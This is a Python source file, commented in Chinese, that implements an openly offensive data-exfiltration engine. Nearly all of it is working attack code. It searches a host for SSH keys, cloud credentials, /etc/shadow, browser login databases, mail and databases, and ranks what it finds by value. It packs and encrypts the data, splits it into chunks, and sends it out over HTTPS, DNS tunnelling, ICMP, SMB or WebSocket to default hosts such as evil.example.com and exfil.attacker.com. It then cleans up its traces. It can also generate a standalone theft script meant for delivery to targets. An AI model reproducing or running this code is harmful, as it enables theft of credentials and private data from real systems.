"""
ExfiltrationEngine — 数据窃取引擎
攻击链最后闭环: 发现→分类→打包→加密→分片→多通道外传→清理
"""

import os, json, base64, zlib, hashlib, time, shutil, tempfile, struct, socket
from pathlib import Path
from typing import Optional
from dataclasses import dataclass, field

# ── 1. 敏感数据发现 ─────────────────────────────────

SENSITIVE_PATTERNS = {
    # 数据库
    "mysql":       ["/etc/mysql/**", "/var/lib/mysql/**", "~/.my.cnf", "my.cnf", "*.sql", "*.sql.gz"],
    "postgresql":  ["/var/lib/postgresql/**", "~/.pgpass", "*.pgdump", "*.psql"],
    "mongodb":     ["/var/lib/mongodb/**", "/data/db/**", "mongod.conf", "*.bson"],
    "redis":       ["/var/lib/redis/**", "redis.conf", "*.rdb", "dump.rdb"],
    "sqlite":      ["*.db", "*.sqlite", "*.sqlite3"],

    # 凭据/密钥
    "credentials": [
        "~/.ssh/id_*", "~/.aws/credentials", "~/.aws/config",
        "~/.azure/accessTokens.json", "~/.azure/azureProfile.json",
        "~/.config/gcloud/**", "~/.kube/config",
        "*.pem", "*.key", "*.pfx", "*.p12", "*.jks", "*.keystore",
        "~/.docker/config.json", "~/.netrc", "~/.git-credentials",
        "/etc/shadow", "~/.bash_history", "~/.zsh_history",
        ".env", ".env.*", "*.env", "docker-compose.yml", "docker-compose.yaml",
        "config.json", "secrets.yml", "secrets.yaml", "credentials.json",
        "appsettings.json", "web.config", "php.ini",
        "id_rsa", "id_ecdsa", "id_ed25519",
    ],

    # 浏览器数据
    "browsers": [
        "~/.mozilla/firefox/**/logins.json",
        "~/.mozilla/firefox/**/key4.db",
        "~/.mozilla/firefox/**/cookies.sqlite",
        "~/.config/google-chrome/**/Login Data",
        "~/.config/google-chrome/**/Cookies",
        "~/.config/chromium/**/Login Data",
        "~/Library/Application Support/Google/Chrome/**/Login Data",
        "~/AppData/Local/Google/Chrome/**/Login Data",
    ],

    # 邮件
    "mail":         ["/var/mail/**", "/var/spool/mail/**", "*.mbox", "*.eml", "*.pst"],
    # 源码/文档
    "source":       ["*.py", "*.js", "*.rb", "*.php", "*.java", "*.go", "*.ts", "*.cs", "*.swift"],
    "documents":    ["*.pdf", "*.docx", "*.xlsx", "*.pptx", "*.txt", "*.md", "*.csv", "*.json", "*.xml", "*.yaml", "*.yml"],
    # 日志
    "logs":         ["/var/log/**/*.log", "*.log", "~/.bash_history", "~/.zsh_history"],
    # 系统信息
    "system":       ["/etc/passwd", "/etc/shadow", "/etc/hosts", "/etc/hostname", "/proc/cpuinfo", "/proc/meminfo", "/etc/os-release"],
}

DISCOVERY_PRIORITY = ["credentials", "databases", "browsers", "mail", "source", "documents", "logs", "system"]


def discover_sensitive(root: str = "/", categories: list = None, max_depth: int = 4) -> dict:
    """扫描发现敏感数据"""
    if categories is None:
        categories = list(SENSITIVE_PATTERNS.keys())

    results = {}
    for cat in categories:
        patterns = SENSITIVE_PATTERNS.get(cat, [])
        results[cat] = []
        for pat in patterns:
            resolved = os.path.expanduser(pat)
            resolved = resolved.replace("/**/", "/").replace("**/", "")
            # Use glob
            import glob
            try:
                matches = glob.glob(resolved, recursive=True)
                for m in matches[:50]:  # cap per pattern
                    if os.path.exists(m):
                        size = os.path.getsize(m) if os.path.isfile(m) else 0
                        results[cat].append({
                            "path": m,
                            "size": size,
                            "type": "file" if os.path.isfile(m) else "dir",
                        })
            except:
                pass
    return results


# ── 2. 数据分类与估值 ─────────────────────────────────

def classify_files(files: dict) -> list:
    """分类并打分，按价值排序"""
    scored = []
    value_map = {
        "credentials": 100, "databases": 90, "browsers": 85,
        "mail": 70, "source": 50, "documents": 40,
        "logs": 20, "system": 10,
    }
    for cat, items in files.items():
        base = value_map.get(cat, 5)
        for item in items:
            score = base
            # 大小加分
            if item.get("size", 0) > 1024 * 1024:  # >1MB
                score += 10
            if item.get("size", 0) > 100 * 1024 * 1024:  # >100MB
                score -= 20  # 太大难传
            scored.append({**item, "category": cat, "score": score})
    return sorted(scored, key=lambda x: x["score"], reverse=True)


# ── 3. 打包压缩 ─────────────────────────────────────

def pack_files(file_list: list, output: str = None, method: str = "zip", password: str = None) -> str:
    """打包文件列表"""
    if output is None:
        output = f"/tmp/exfil_{int(time.time())}.{method}"

    if method == "zip":
        import zipfile
        with zipfile.ZipFile(output, 'w', zipfile.ZIP_DEFLATED) as zf:
            for f in file_list:
                path = f if isinstance(f, str) else f.get("path", f)
                if os.path.exists(path) and os.path.isfile(path):
                    arcname = os.path.basename(path)
                    zf.write(path, arcname)
    elif method == "tar.gz":
        import tarfile
        with tarfile.open(output, "w:gz") as tf:
            for f in file_list:
                path = f if isinstance(f, str) else f.get("path", f)
                if os.path.exists(path) and os.path.isfile(path):
                    tf.add(path, arcname=os.path.basename(path))

    if password:
        encrypted = output + ".enc"
        encrypt_file(output, encrypted, password)
        os.remove(output)
        return encrypted

    return output


# ── 4. 加密 ─────────────────────────────────────────

def encrypt_file(input_path: str, output_path: str = None, password: str = None, algo: str = "aes256") -> str:
    """AES-256-GCM加密文件"""
    if output_path is None:
        output_path = input_path + ".enc"
    if password is None:
        password = hashlib.sha256(os.urandom(32)).hexdigest()[:16]

    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    key = hashlib.sha256(password.encode()).digest()
    aesgcm = AESGCM(key)
    nonce = os.urandom(12)

    with open(input_path, 'rb') as f:
        data = f.read()

    ct = aesgcm.encrypt(nonce, data, None)

    with open(output_path, 'wb') as f:
        f.write(nonce + ct)

    return output_path


def decrypt_file(input_path: str, output_path: str, password: str) -> bool:
    """解密"""
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    key = hashlib.sha256(password.encode()).digest()
    aesgcm = AESGCM(key)

    with open(input_path, 'rb') as f:
        nonce = f.read(12)
        ct = f.read()

    pt = aesgcm.decrypt(nonce, ct, None)
    with open(output_path, 'wb') as f:
        f.write(pt)
    return True


# ── 5. 分片 ─────────────────────────────────────────

def split_file(input_path: str, chunk_size: int = 1024 * 1024, output_dir: str = None) -> list:
    """分片大文件"""
    if output_dir is None:
        output_dir = f"/tmp/exfil_chunks_{int(time.time())}"
    os.makedirs(output_dir, exist_ok=True)

    chunks = []
    with open(input_path, 'rb') as f:
        i = 0
        while True:
            chunk = f.read(chunk_size)
            if not chunk:
                break
            chunk_path = os.path.join(output_dir, f"chunk_{i:06d}.dat")
            with open(chunk_path, 'wb') as cf:
                cf.write(chunk)
            chunks.append({"index": i, "path": chunk_path, "size": len(chunk)})
            i += 1
    return chunks


# ── 6. 多通道外传 ───────────────────────────────────

class ExfilChannel:
    """外传通道基类"""
    name = "base"
    max_chunk_size = 1024 * 1024

    def send_file(self, path: str) -> bool:
        raise NotImplementedError

    def send_data(self, data: bytes, filename: str) -> bool:
        raise NotImplementedError


class HTTPSExfil(ExfilChannel):
    """HTTPS POST外传"""
    name = "https"

    def __init__(self, server_url: str, headers: dict = None, timeout: int = 30):
        self.server_url = server_url
        self.headers = headers or {"User-Agent": "Mozilla/5.0"}
        self.timeout = timeout

    def send_file(self, path: str) -> bool:
        import requests
        with open(path, 'rb') as f:
            r = requests.post(
                self.server_url,
                files={"file": (os.path.basename(path), f)},
                headers=self.headers,
                timeout=self.timeout,
                verify=False,
            )
        return r.status_code in (200, 201, 204)

    def send_data(self, data: bytes, filename: str) -> bool:
        import requests
        r = requests.post(
            self.server_url,
            files={"file": (filename, data)},
            headers=self.headers,
            timeout=self.timeout,
            verify=False,
        )
        return r.status_code in (200, 201, 204)


class DNSExfil(ExfilChannel):
    """DNS隧道外传 (TXT/DNS查询编码)"""
    name = "dns"

    def __init__(self, domain: str, chunk_size: int = 30):
        self.domain = domain
        self.chunk_size = chunk_size

    def send_data(self, data: bytes, filename: str = "data") -> bool:
        b64_data = base64.b64encode(data).decode()
        # 分片发送
        chunks = [b64_data[i:i + self.chunk_size] for i in range(0, len(b64_data), self.chunk_size)]
        success = 0
        for idx, chunk in enumerate(chunks):
            query = f"{idx:04x}.{chunk}.{self.domain}"
            try:
                socket.gethostbyname(query)
                success += 1
            except:
                pass
            time.sleep(0.1)
        return success > 0

    def send_file(self, path: str) -> bool:
        with open(path, 'rb') as f:
            return self.send_data(f.read(), os.path.basename(path))


class ICMPExfil(ExfilChannel):
    """ICMP隧道外传"""
    name = "icmp"

    def __init__(self, target_ip: str, chunk_size: int = 1400):
        self.target_ip = target_ip
        self.chunk_size = chunk_size

    def send_data(self, data: bytes, filename: str = "data") -> bool:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            sock.settimeout(2)

            header = struct.pack("!BBHI", 8, 0, 0, os.getpid() & 0xFFFF)
            total = len(data)
            for i in range(0, total, self.chunk_size):
                chunk = data[i:i + self.chunk_size]
                # 嵌入片头: [total_len:4][chunk_offset:4][filename_len:1]
                payload = struct.pack("!IIB", total, i, len(filename))
                payload += filename.encode()[:255] + b"\x00" + chunk
                checksum = self._checksum(header + payload)
                packet = struct.pack("!BBHI", 8, 0, checksum, os.getpid() & 0xFFFF)
                sock.sendto(packet + payload, (self.target_ip, 0))
                time.sleep(0.05)
            return True
        except Exception:
            return False

    def _checksum(self, data: bytes) -> int:
        if len(data) % 2:
            data += b'\x00'
        s = sum(struct.unpack("!%dH" % (len(data) // 2), data))
        s = (s >> 16) + (s & 0xFFFF)
        s += s >> 16
        return ~s & 0xFFFF

    def send_file(self, path: str) -> bool:
        with open(path, 'rb') as f:
            return self.send_data(f.read(), os.path.basename(path))


class SMBExfil(ExfilChannel):
    """SMB共享外传 (需要smbclient)"""
    name = "smb"

    def __init__(self, share: str, username: str = "", password: str = "", domain: str = ""):
        self.share = share
        self.username = username
        self.password = password
        self.domain = domain

    def send_file(self, path: str) -> bool:
        import subprocess
        cmd = ["smbclient", self.share, "-c", f'put "{path}" "{os.path.basename(path)}"']
        if self.username:
            cmd += ["-U", f"{self.domain}\\{self.username}%{self.password}" if self.domain else f"{self.username}%{self.password}"]
        try:
            r = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            return r.returncode == 0
        except:
            return False

    def send_data(self, data: bytes, filename: str) -> bool:
        tmp = f"/tmp/{filename}"
        with open(tmp, 'wb') as f:
            f.write(data)
        result = self.send_file(tmp)
        os.remove(tmp)
        return result


class WebSocketExfil(ExfilChannel):
    """WebSocket外传"""
    name = "websocket"

    def __init__(self, ws_url: str):
        self.ws_url = ws_url

    def send_data(self, data: bytes, filename: str = "data") -> bool:
        try:
            import websocket
            b64 = base64.b64encode(data).decode()
            ws = websocket.create_connection(self.ws_url, timeout=10)
            ws.send(json.dumps({"filename": filename, "data": b64}))
            ws.close()
            return True
        except:
            return False

    def send_file(self, path: str) -> bool:
        with open(path, 'rb') as f:
            return self.send_data(f.read(), os.path.basename(path))


CHANNEL_REGISTRY = {
    "https":     HTTPSExfil,
    "dns":       DNSExfil,
    "icmp":      ICMPExfil,
    "smb":       SMBExfil,
    "websocket": WebSocketExfil,
}


# ── 7. 主引擎 ───────────────────────────────────────

@dataclass
class ExfilJob:
    """单次外传任务"""
    id: str
    files: list
    total_size: int = 0
    chunks: list = field(default_factory=list)
    status: str = "pending"  # pending/packing/encrypting/sending/done/failed
    channel: str = "https"
    progress: float = 0.0


class ExfiltrationEngine:
    """数据窃取主引擎"""

    def __init__(self):
        self.jobs: dict = {}
        self.channels: dict = {}

    def discover(self, root: str = "/", categories: list = None, max_depth: int = 4) -> dict:
        """步骤1: 发现敏感数据"""
        raw = discover_sensitive(root, categories, max_depth)
        classified = classify_files(raw)
        total_files = sum(len(v) for v in raw.values())
        return {
            "raw": raw,
            "classified": classified[:100],  # top 100 by value
            "total_files": total_files,
            "total_categories": len(raw),
            "top_hits": classified[:10],
        }

    def scan_quick(self, paths: list = None) -> dict:
        """快速扫描指定路径"""
        if paths is None:
            paths = [
                "/home", "/root", "/var/www", "/opt",
                "/etc", "/tmp", "/var/backups",
            ]
        results = {}
        for p in paths:
            if os.path.exists(p) and os.path.isdir(p):
                for root, dirs, files in os.walk(p):
                    # 限制深度
                    depth = root.replace(p, "").count(os.sep)
                    if depth > 3:
                        dirs.clear()
                        continue
                    for f in files:
                        fpath = os.path.join(root, f)
                        try:
                            size = os.path.getsize(fpath)
                            results[fpath] = {"path": fpath, "size": size, "name": f}
                        except:
                            pass
        return {"found": len(results), "files": [{"path": k, **v} for k, v in list(results.items())[:200]]}

    def pack(self, files: list, output: str = None, method: str = "zip", password: str = None) -> dict:
        """步骤2: 打包"""
        pkg_path = pack_files(files, output, method, password)
        size = os.path.getsize(pkg_path)
        return {
            "path": pkg_path,
            "size": size,
            "size_human": f"{size / 1024 / 1024:.2f}MB" if size > 1024 * 1024 else f"{size / 1024:.2f}KB",
            "method": method,
            "encrypted": bool(password),
            "files_count": len(files),
        }

    def encrypt(self, input_path: str, password: str = None) -> dict:
        """步骤3: 加密"""
        enc_path = encrypt_file(input_path, password=password)
        size = os.path.getsize(enc_path)
        return {"path": enc_path, "size": size, "original": input_path}

    def split(self, input_path: str, chunk_size_mb: int = 1) -> dict:
        """步骤4: 分片"""
        chunks = split_file(input_path, chunk_size=chunk_size_mb * 1024 * 1024)
        return {
            "input": input_path,
            "chunks": chunks,
            "total_chunks": len(chunks),
            "chunk_size_mb": chunk_size_mb,
        }

    def exfiltrate(
        self,
        input_path: str,
        channel: str = "https",
        channel_config: dict = None,
        encrypt_first: bool = True,
        encrypt_password: str = None,
        split_first: bool = True,
        chunk_size_mb: int = 1,
    ) -> dict:
        """步骤5: 完整外传流水线"""
        job_id = f"job_{int(time.time())}_{os.urandom(4).hex()}"
        job = ExfilJob(id=job_id, files=[input_path])
        self.jobs[job_id] = job

        current_file = input_path
        steps = []

        # 加密
        if encrypt_first:
            job.status = "encrypting"
            enc = self.encrypt(current_file, encrypt_password)
            current_file = enc["path"]
            steps.append({"step": "encrypt", "output": current_file, "size": enc["size"]})

        # 分片
        if split_first:
            job.status = "splitting"
            split_result = self.split(current_file, chunk_size_mb)
            job.chunks = split_result["chunks"]
            job.total_size = sum(c["size"] for c in job.chunks)
            steps.append({"step": "split", "chunks": len(job.chunks), "size_mb": chunk_size_mb})
        else:
            job.chunks = [{"index": 0, "path": current_file, "size": os.path.getsize(current_file)}]
            job.total_size = job.chunks[0]["size"]

        # 外传
        job.status = "sending"
        ch = self._get_channel(channel, channel_config or {})
        sent = 0
        failed = 0
        for i, chunk in enumerate(job.chunks):
            try:
                ok = ch.send_file(chunk["path"])
                if ok:
                    sent += 1
                else:
                    failed += 1
                job.progress = (i + 1) / len(job.chunks)
            except Exception as e:
                failed += 1

        job.status = "done" if failed == 0 else ("partial" if sent > 0 else "failed")

        # 清理临时文件
        self._cleanup(current_file, job.chunks)

        return {
            "job_id": job_id,
            "status": job.status,
            "channel": channel,
            "total_chunks": len(job.chunks),
            "sent": sent,
            "failed": failed,
            "total_size": job.total_size,
            "total_size_human": f"{job.total_size / 1024 / 1024:.2f}MB",
            "encrypted": encrypt_first,
            "steps": steps,
        }

    def _get_channel(self, name: str, config: dict) -> ExfilChannel:
        cls = CHANNEL_REGISTRY.get(name)
        if cls is None:
            raise ValueError(f"Unknown channel: {name}. Available: {list(CHANNEL_REGISTRY.keys())}")

        if name == "https":
            return cls(config.get("server_url", "https://evil.example.com/upload"))
        elif name == "dns":
            return cls(config.get("domain", "exfil.attacker.com"))
        elif name == "icmp":
            return cls(config.get("target_ip", "10.0.0.1"))
        elif name == "smb":
            return cls(
                config.get("share", "//10.0.0.1/share"),
                config.get("username", ""),
                config.get("password", ""),
                config.get("domain", ""),
            )
        elif name == "websocket":
            return cls(config.get("ws_url", "wss://evil.example.com/ws"))
        return cls()

    def _cleanup(self, main_file: str, chunks: list):
        """清理临时文件"""
        for c in chunks:
            try:
                if os.path.exists(c["path"]) and c["path"] != main_file:
                    os.remove(c["path"])
            except:
                pass

    def list_channels(self) -> dict:
        """列出所有外传通道"""
        return {
            name: {
                "description": cls.__doc__ or f"{name} exfiltration channel",
                "max_chunk_size": getattr(cls, "max_chunk_size", 1024 * 1024),
            }
            for name, cls in CHANNEL_REGISTRY.items()
        }

    def generate_script(
        self,
        target_files: list,
        channel: str = "https",
        channel_config: dict = None,
        encrypt: bool = True,
        language: str = "python",
    ) -> str:
        """生成独立外传脚本 (可投递到目标执行)"""
        config_json = json.dumps(channel_config or {}, indent=2)
        files_json = json.dumps([f if isinstance(f, str) else f.get("path", "") for f in target_files], indent=2)

        script = f'''#!/usr/bin/env python3
"""Auto-generated exfiltration script — ExfiltrationEngine"""
import os, sys, json, base64, hashlib, time, struct

TARGET_FILES = {files_json}
CHANNEL = "{channel}"
CHANNEL_CONFIG = {config_json}
ENCRYPT = {str(encrypt).lower()}

def pack_files(files, output="/tmp/.exfil_pkg.zip"):
    import zipfile
    with zipfile.ZipFile(output, 'w', zipfile.ZIP_DEFLATED) as zf:
        for f in files:
            if os.path.exists(f):
                zf.write(f, os.path.basename(f))
    return output

def encrypt_file(path, password=None):
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    if not password:
        password = hashlib.sha256(os.urandom(32)).hexdigest()[:16]
    key = hashlib.sha256(password.encode()).digest()
    aesgcm = AESGCM(key)
    nonce = os.urandom(12)
    with open(path, 'rb') as f:
        ct = aesgcm.encrypt(nonce, f.read(), None)
    out = path + ".enc"
    with open(out, 'wb') as f:
        f.write(nonce + ct)
    return out

def exfil_https(path, url):
    import requests, urllib3
    urllib3.disable_warnings()
    with open(path, 'rb') as f:
        r = requests.post(url, files={{"file": (os.path.basename(path), f)}}, verify=False, timeout=30)
    return r.status_code in (200, 201, 204)

def exfil_dns(path, domain):
    with open(path, 'rb') as f:
        b64 = base64.b64encode(f.read()).decode()
    for i in range(0, len(b64), 30):
        chunk = b64[i:i+30]
        try:
            socket.gethostbyname(f"{{i:04x}}.{{chunk}}.{{domain}}")
        except:
            pass
        time.sleep(0.1)
    return True

def main():
    print(f"[*] ExfiltrationEngine — starting")
    pkg = pack_files(TARGET_FILES)
    print(f"[+] Packed: {{pkg}} ({{os.path.getsize(pkg)}} bytes)")

    final = pkg
    if ENCRYPT:
        final = encrypt_file(pkg)
        print(f"[+] Encrypted: {{final}}")

    if CHANNEL == "https":
        ok = exfil_https(final, CHANNEL_CONFIG.get("server_url", "https://evil.example.com/upload"))
    elif CHANNEL == "dns":
        ok = exfil_dns(final, CHANNEL_CONFIG.get("domain", "exfil.attacker.com"))
    else:
        print(f"[-] Unknown channel: {{CHANNEL}}")
        sys.exit(1)

    # cleanup
    os.remove(pkg)
    if final != pkg:
        os.remove(final)
    print(f"[{{'+' if ok else '-'}}] Exfiltration {{'SUCCESS' if ok else 'FAILED'}}")

if __name__ == "__main__":
    main()
'''
        return script


# ── 8. 分发函数 ─────────────────────────────────────

def exfil_discover(target: str = "/", categories: str = None) -> dict:
    """分发: 敏感数据发现"""
    engine = ExfiltrationEngine()
    cats = categories.split(",") if categories else None
    return engine.discover(root=target, categories=cats)


def exfil_pack(files_json: str, output: str = None, method: str = "zip", password: str = None) -> dict:
    """分发: 打包"""
    engine = ExfiltrationEngine()
    files = json.loads(files_json) if files_json.startswith("[") else [files_json]
    return engine.pack(files, output, method, password)


def exfil_encrypt(input_path: str, password: str = None) -> dict:
    """分发: 加密"""
    engine = ExfiltrationEngine()
    return engine.encrypt(input_path, password)


def exfil_split(input_path: str, chunk_size_mb: int = 1) -> dict:
    """分发: 分片"""
    engine = ExfiltrationEngine()
    return engine.split(input_path, chunk_size_mb)


def exfil_send(
    input_path: str,
    channel: str = "https",
    server_url: str = "",
    domain: str = "",
    target_ip: str = "",
    encrypt: bool = True,
    password: str = None,
    split: bool = True,
    chunk_size_mb: int = 1,
) -> dict:
    """分发: 完整外传"""
    engine = ExfiltrationEngine()
    config = {}
    if server_url:
        config["server_url"] = server_url
    if domain:
        config["domain"] = domain
    if target_ip:
        config["target_ip"] = target_ip
    return engine.exfiltrate(input_path, channel, config, encrypt, password, split, chunk_size_mb)


def exfil_channels() -> dict:
    """分发: 列出通道"""
    engine = ExfiltrationEngine()
    return engine.list_channels()


def exfil_script(target_files_json: str, channel: str = "https", server_url: str = "", domain: str = "", encrypt: bool = True) -> str:
    """分发: 生成独立脚本"""
    engine = ExfiltrationEngine()
    files = json.loads(target_files_json) if target_files_json.startswith("[") else [target_files_json]
    config = {}
    if server_url:
        config["server_url"] = server_url
    if domain:
        config["domain"] = domain
    return engine.generate_script(files, channel, config, encrypt)


def exfil_quick(target_paths: str = None) -> dict:
    """分发: 快速扫描"""
    engine = ExfiltrationEngine()
    paths = json.loads(target_paths) if target_paths and target_paths.startswith("[") else None
    return engine.scan_quick(paths)
